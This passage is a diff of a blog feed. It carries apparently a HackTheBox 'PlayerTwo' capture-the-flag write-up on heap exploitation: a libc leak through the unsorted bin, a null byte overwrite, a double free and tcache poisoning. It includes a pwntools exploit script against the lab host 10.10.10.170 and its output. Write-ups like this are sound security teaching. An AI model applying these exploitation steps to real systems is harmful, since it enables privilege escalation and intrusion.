 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Hex.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Hex.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       Upper part: Original binary loaded in &lt;em&gt;Ghidra&lt;/em&gt;. Marked red is the address of the argument string. Green is the argument string denoted in ASCII format. &lt;br /&gt; Middle: Original view in a hex editor. 73 in ASCII is equivalent to the character lower s. &lt;br /&gt; Lower: Overwritten argument. To write a p one has i.e. to replace the 73 by 70.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tun0
@@ -1193,18 +1256,14 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
     &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;# freeing the i-th config
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/unsorted_bin.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/unsorted_bin.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;By clearing the tcache by allocating seven chunks of size 0xf8 and then allocating two empty configs we can leak this address. From the figure above we can also see that the libc base address is at 0x7effe6dab000 and our leaked address is 0x7effe6f8fca0. Since that difference is constant every time we run the binary and we can calculate the offset once (0x1e4ca0) and hardcode it.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;# clear tcache
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;# add two empty configs
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;main_arena_leak_u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readCFG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# get leak
@@ -1239,24 +1298,16 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# size is that it has to be congruent 8 modulo 16.
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Chunk1.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk1.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Chunk2.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk2.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       Illustrating the null byte overwrite.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;So to get two descriptions adjacent I thought that since the config name always needs a chunk of size 0x30 of usable size (which is 0x41 in memory): If I allocate one or two configs with description size 0x30 and free them the next configs with description sizes bigger than 0x30 might use the just freed 0x30 chunks but allocate the descriptions after all the previously allocated chunks. The code and result might clarify what I just tried to explain with words:&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# A's will be 41 in memory
@@ -1267,14 +1318,10 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# but also with a size%16=8 
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Chunk3.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk3.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       Game descriptions being adjacent - the setup needed for the double free.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p&gt;So we only have to repeat what we have done earlier: free and then allocate the same chunk again:&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# A's will be 41 in memory
@@ -1287,14 +1334,10 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
 &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Chunk4.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Chunk4.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       Our plan worked - we overwrote the chunk size header from 0x171 to 0x100.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;h3 id=&quot;the-double-free&quot;&gt;The double free&lt;/h3&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Now that we were able to set the chunk size header from 0x1XY to 0x100 we can do a double free attack similar to the before mentioned &lt;em&gt;zero_to_hero&lt;/em&gt; challenge &lt;a href=&quot;#[1]&quot;&gt;[1]&lt;/a&gt; with small variations.&lt;br /&gt;
@@ -1357,14 +1400,10 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/tcache.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/tcache.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       Upper: Chunk 10 inside the 0x190 tcache bin but with size 0x100.&lt;br /&gt; Lower: Two chunks of size 0x100 inside the 0x100 tcache bin but pointing to the same address.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;h3 id=&quot;tcache-poisoning&quot;&gt;Tcache poisoning&lt;/h3&gt;
 &lt;p&gt;Now we simply need to do the Tcache poisoning:&lt;/p&gt;
@@ -1386,7 +1425,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;span class=&quot;c1&quot;&gt;#p = process('./Protobs') 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sshConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'10.10.10.170'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'observer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id_rsa'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sshConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/opt/Configuration_Utility/Protobs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'protobs@player2:~$ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# name through controller (6 items)
 &lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Game                ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -1409,7 +1448,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
     &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'protobs@player2:~$ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Config Index    ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Description         ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Getting chunks into the unsorted bin by filling up the 0xf8 tcache bin with chunks 0-6
 # chunk 7 and 8 go into unsorted bin with its fd and bk pointer pointing to the main arena
@@ -1479,7 +1518,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
     &lt;span class=&quot;n&quot;&gt;Arch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;amd64&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mf&quot;&gt;5.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;ASLR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;Enabled&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'/opt/Configuration_Utility/Protobs'&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37068&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/opt/Configuration_Utility/Protobs'&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37068&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Main&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arena&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f31c4f37ca0&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Libc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f31c4d53000&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Free&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f31c4f3a5a8&lt;/span&gt;
@@ -1659,7 +1698,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 
 &lt;p&gt;&lt;a name=&quot;[2]&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&quot;&gt;Another source of useful write-ups&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!</summary></entry><entry><title type="html">Write-up: HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="Write-up: HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
